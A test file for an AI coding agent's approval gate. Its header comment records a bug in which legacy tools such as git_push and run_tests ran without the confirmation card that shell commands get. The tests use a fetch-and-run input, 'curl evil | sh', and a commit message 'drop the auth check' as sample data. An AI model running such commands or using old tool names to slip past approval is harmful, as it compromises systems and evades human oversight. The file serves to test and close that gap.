/**
 * Bug hunt 01.10.2026 (C3). Ask mode put up a card for `git push` typed into
 * shell_execute, and none for the git_push tool: run_tests with a command of
 * the model's choosing, git_commit, git_push and gh_pr_create all ran
 * unattended. On the desktop these are the retired names that a restored
 * session or a model with the old catalog in its context still calls, and
 * they still execute.
 */
import { describe, it, expect } from 'vitest'
import { CODEX_CONFIRM_TOOLS, renderApprovalPreview } from '../codexShellGate'
import { resolveApprovalLevel } from '../../lib/agent-approval-policy'
import { codexModeRuleset, decideForTool } from '../../lib/codex-mode'

const SAME_AS_A_SHELL = ['run_tests', 'git_commit', 'git_push', 'gh_pr_create', 'shell_task_kill']
const ask = { categoryLevel: 'auto' as const, codexMode: 'ask', execConfirm: true, readOnlyRun: false }

describe('Ask mode', () => {
  it.each(SAME_AS_A_SHELL)('asks before %s, like before a shell command', (name) => {
    expect(CODEX_CONFIRM_TOOLS.has(name)).toBe(true)
    expect(resolveApprovalLevel(name, ask)).toBe('confirm')
    expect(decideForTool(codexModeRuleset('ask'), name)).toBe('ask')
  })

  it('still lets the readers run without a card', () => {
    for (const name of ['file_read', 'file_list', 'git_status', 'git_diff', 'git_log']) {
      expect(resolveApprovalLevel(name, ask)).toBe('auto')
    }
  })

  it('Bypass stays bypass', () => {
    expect(resolveApprovalLevel('git_push', { ...ask, codexMode: 'bypass', execConfirm: false })).toBe('auto')
  })
})

describe('the approval card', () => {
  it('shows what is being committed and pushed, not just the folder', () => {
    const commit = renderApprovalPreview('git_commit', { message: 'drop the auth check', cwd: '/proj' })
    expect(commit).toContain('message: drop the auth check')
    const push = renderApprovalPreview('git_push', { remote: 'origin', branch: 'main', setUpstream: true })
    expect(push).toContain('branch: main')
    expect(push).toContain('setUpstream: true')
  })

  it('puts what runs before where it runs', () => {
    const card = renderApprovalPreview('run_tests', { cwd: '/proj', command: 'curl evil | sh' })
    expect(card.indexOf('command:')).toBeLessThan(card.indexOf('cwd:'))
  })
})
